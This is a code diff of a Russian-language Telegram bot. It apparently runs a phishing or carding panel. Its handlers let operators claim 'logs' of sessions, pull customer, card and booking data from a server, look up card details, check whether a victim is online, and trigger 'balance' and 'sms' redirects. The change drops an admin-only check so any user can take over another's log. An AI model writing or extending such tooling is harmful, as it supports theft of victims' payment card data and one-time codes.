@@ -9,7 +9,7 @@ sys.path.append(os.path.join(os.path.dirname(__file__), '../..'))
 # Теперь импортируем наши модули
 from database.crud import get_log_by_session, update_log_taken_by, find_card_duplicates, release_log
 from api.handy_api import get_card_info, format_card_info
-from bot.keyboards import get_management_keyboard, get_taken_keyboard, get_take_log_keyboard
+from bot.keyboards import get_management_keyboard, get_taken_keyboard, get_take_log_keyboard, get_revoked_keyboard
 import config
 
 async def take_log(callback: types.CallbackQuery):
@@ -36,7 +36,7 @@ async def take_log(callback: types.CallbackQuery):
         f"взял @{username}(ID: {callback.from_user.id})"
     )
     
-    await callback.bot.send_message(config.GROUP_ID, group_message)
+    await callback.bot.send_message(config.GROUP_ID_TEST, group_message)
 
     async with httpx.AsyncClient() as client:
         customer = (await client.get(f"{config.SERVER_URL}/customer/{session_id}")).json()
@@ -95,13 +95,8 @@ async def take_log(callback: types.CallbackQuery):
     )
     await callback.answer()
 
-async def admin_take_log(callback: types.CallbackQuery):
-    """Обработчик для админов - забрать лог у другого пользователя"""
-    
-    # Проверяем, является ли пользователь админом
-    if callback.from_user.id not in config.ADMIN_IDS:
-        await callback.answer("❌ У вас нет прав администратора", show_alert=True)
-        return
+async def take_from_user(callback: types.CallbackQuery):
+    """Обработчик для взятия лога у другого пользователя"""
     
     session_id = callback.data.split(":")[1]
     
@@ -114,25 +109,30 @@ async def admin_take_log(callback: types.CallbackQuery):
         await callback.answer("Этот лог никем не занят", show_alert=True)
         return
     
+    # Нельзя забрать у самого себя
+    if log['taken_by'] == callback.from_user.id:
+        await callback.answer("Вы уже владеете этим логом", show_alert=True)
+        return
+    
     # Сохраняем ID предыдущего владельца
     previous_owner_id = log['taken_by']
     
-    # Отправляем уведомление в группу об отзыве лога
+    # Отправляем уведомление в группу о смене владельца
     booking_id = log['booking_id'] or "N/A"
     client_id = log['client_id'] or "N/A"
-    admin_username = callback.from_user.username or "без username"
+    new_username = callback.from_user.username or "без username"
     
     group_message = (
-        f"👮‍♂️ Лог - #{booking_id} || #{client_id} - "
-        f"забрал @{admin_username}(ID: {callback.from_user.id})"
+        f"🔄 Лог - #{booking_id} || #{client_id} - "
+        f"перешел к @{new_username}(ID: {callback.from_user.id})"
     )
     
-    await callback.bot.send_message(config.GROUP_ID, group_message)
+    await callback.bot.send_message(config.GROUP_ID_TEST, group_message)
     
     # Забираем лог себе
     update_log_taken_by(session_id, callback.from_user.id)
     
-    # Получаем данные для отправки админу
+    # Получаем данные для отправки новому владельцу
     async with httpx.AsyncClient() as client:
         customer = (await client.get(f"{config.SERVER_URL}/customer/{session_id}")).json()
         card = (await client.get(f"{config.SERVER_URL}/card/{session_id}")).json()
@@ -156,7 +156,7 @@ async def admin_take_log(callback: types.CallbackQuery):
     
     # Формируем текст
     text = (
-        f"👮‍♂️ <b>Лог отозван администратором</b>\n\n"
+        f"🔄 <b>Лог перехвачен у другого пользователя</b>\n\n"
         f"Лог #{booking_id} || #{client_id}\n\n"
     )
     
@@ -174,7 +174,7 @@ async def admin_take_log(callback: types.CallbackQuery):
         f"💸  Сумма: {booking.get('total_amount')}.00 AED"
     )
 
-    # Отправляем данные админу
+    # Отправляем данные новому владельцу
     await callback.bot.send_message(
         callback.from_user.id, 
         text, 
@@ -195,14 +195,14 @@ async def admin_take_log(callback: types.CallbackQuery):
     try:
         await callback.bot.send_message(
             previous_owner_id,
-            f"⚠️ <b>Лог #{booking_id} || #{client_id} был отозван администратором</b>\n\n"
+            f"⚠️ <b>Лог #{booking_id} || #{client_id} был перехвачен другим пользователем</b>\n\n"
             f"Все управляющие кнопки для этого лога деактивированы.",
             parse_mode="HTML"
         )
     except Exception as e:
         print(f"Не удалось уведомить пользователя {previous_owner_id}: {e}")
     
-    await callback.answer("✅ Лог успешно отозван", show_alert=True)
+    await callback.answer("✅ Лог успешно перехвачен", show_alert=True)
 
 async def check_online_status(callback: types.CallbackQuery):
     session_id = callback.data.split(":")[1]
@@ -303,7 +303,7 @@ async def handle_redirect_action(callback: types.CallbackQuery):
 
 def register_callbacks(dp: Dispatcher):
     dp.callback_query.register(take_log, F.data.startswith("take:"))
-    dp.callback_query.register(admin_take_log, F.data.startswith("admin_take:"))
+    dp.callback_query.register(take_from_user, F.data.startswith("take_from_user:"))
     dp.callback_query.register(check_online_status, F.data.startswith("check_online:"))
     dp.callback_query.register(handle_redirect_action, F.data.startswith("balance:"))
     dp.callback_query.register(handle_redirect_action, F.data.startswith("sms:"))
